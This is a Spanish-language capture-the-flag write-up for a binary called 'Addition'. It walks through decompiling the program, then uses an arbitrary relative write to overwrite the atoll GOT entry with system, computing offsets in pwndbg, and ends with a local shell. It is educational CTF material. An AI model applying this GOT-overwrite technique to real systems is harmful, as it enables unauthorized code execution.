# Addition

En esta ocasión nos dan un binario que parece estar en un bucle, en donde nos piden una dirección y un valor.

```c
./vuln                                                      
+++++++++++++++++++++++++++
    WELCOME TO ADDITION
+++++++++++++++++++++++++++
add where? 0xdeadbeef
add what? hola
```

Si miramos qué está pasando en Ghidra podremos ver lo siguiente:

```c
void main(void)

{
  longlong lVar1;
  longlong lVar2;
  long in_FS_OFFSET;
  char input [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("+++++++++++++++++++++++++++");
  puts("    WELCOME TO ADDITION");
  puts("+++++++++++++++++++++++++++");
  do {
    write(1,"add where? ",0xb);
    fgets(input,0x10,stdin);
    lVar1 = atoll(input);
    write(1,"add what? ",10);
    fgets(input,0x10,stdin);
    lVar2 = atoll(input);
    *(longlong *)(&buf + lVar1) = lVar2 + *(long *)(&buf + lVar1);
  } while (lVar1 != 0x539);
  FUN_001010f0(0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```

El código solo tiene una función. Efectivamente, nos piden una dirección y, a continuación, un valor para introducir en esa dirección. Pasa una cosa: esa dirección que nos piden no es absoluta y el valor tampoco. Con esto quiero decir que, si vemos la siguiente línea:

```c
*(longlong *)(&buf + lVar1) = lVar2 + *(long *)(&buf + lVar1);
```

Podemos ver que nuestro input se suma en ambos casos y termina siendo relativo a `&buf`.

Si comprobamos las protecciones podemos ver que hay Partial RELRO:

```c
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Esto implica que el GOT se puede sobreescribir. Si miramos el código en Ghidra podemos ver la siguiente línea:

```c
lVar1 = atoll(input);
```

Cada input que introducimos pasa por la función `atoll`, que es un conversor de ASCII a long. Esa función recibe un parámetro que controlamos. Si conseguimos sustituir ese `atoll` por un `system` y le pasamos como argumento `/bin/sh`, podemos conseguir una shell.

Ahora, ¿cómo podemos hacerlo? Ya que tenemos Partial RELRO, podemos cambiar el puntero del GOT de `atoll` por el de `system`. Para eso necesitamos saber antes cuál es la distancia entre `&buf` (el punto desde donde empezamos a escribir si ponemos 0 en el address, que recordemos que es relativo) y el GOT de `atoll`.

```c
pwndbg> x &buf
0x555555558069:	0x00000000
pwndbg> got
. . .
[0x555555558020] atoll@GLIBC_2.2.5 -> 0x555555555070 ◂— endbr64 
. . .
pwndbg> x 0x555555558069 - 0x555555558020
0x49:	Cannot access memory at address 0x49
pwndbg> 
```

Como podemos ver, `atoll` está 73 bytes detrás de donde empezamos a escribir. Esto quiere decir que, si ponemos como primer parámetro `-73`, estaremos escribiendo en el puntero de `atoll`.

Ahora nos queda saber qué poner en atoll. Como hemos visto, lo de asignar valor también es relativo, así que vamos a tener que sacar cuánto le falta a `atoll` para llegar a `system`.

```c
pwndbg> x &system
0x7ffff7c50d60 <__libc_system>:	0xfa1e0ff3
pwndbg> x &atoll
0x7ffff7c43670 <atoll>:	0xfa1e0ff3
pwndbg> x 0x7ffff7c50d60 - 0x7ffff7c43670
0xd6f0:	Cannot access memory at address 0xd6f0
```

Como podemos ver, hay `0xd6f0` bytes, pero el programa trabaja con `longs`, así que se lo vamos a tener que pasar como entero:

```python
python3
>>> 0xd6f0
55024
```

¡Perfecto! Con estos datos podemos hacer que el GOT de `atoll` apunte a `system`. Recordemos que en el código está esto:

```c
atoll(nuestro_input)
```

Así que, si primero hacemos el cambio de `atoll` a `system`, y luego introducimos `/bin/sh`, el programa hará esto:

```c
system("/bin/sh")
```

Y conseguiremos una shell. Vamos a comprobarlo:

```c
+++++++++++++++++++++++++++
    WELCOME TO ADDITION
+++++++++++++++++++++++++++
add where? $ -73
add what? $ 55024
add where? $ /bin/sh
$ whoami
ub1cu0
$  
```

¡Tenemos shell!
